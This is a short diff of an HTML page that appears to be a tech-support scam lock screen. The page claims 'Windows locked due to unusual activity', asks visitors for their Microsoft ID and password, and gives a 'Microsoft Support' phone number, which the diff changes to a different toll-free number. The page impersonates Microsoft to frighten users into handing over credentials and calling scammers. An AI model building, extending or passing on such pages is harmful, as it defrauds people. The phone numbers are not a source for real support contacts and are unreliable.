@@ -699,7 +699,7 @@ top: 5px;">Admin login</span>
 <br>
 <p class="text-center" style="color: #CDCBCB;  margin-top:10px; font-size: 16px; opacity:.9; ">
 Windows locked due to unusual activity.
-<br>Please log in again using your Microsoft ID and password.<br>For assistance, contact Microsoft Support<br><strong>+1-844-421-6224 			 	</strong></p>
+<br>Please log in again using your Microsoft ID and password.<br>For assistance, contact Microsoft Support<br><strong>+1-877-481-2204 			 	</strong></p>
 
 <form action="#">
    <input type="text" name="name" id="name" placeholder="User name" class="text-input" required="" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"><br>
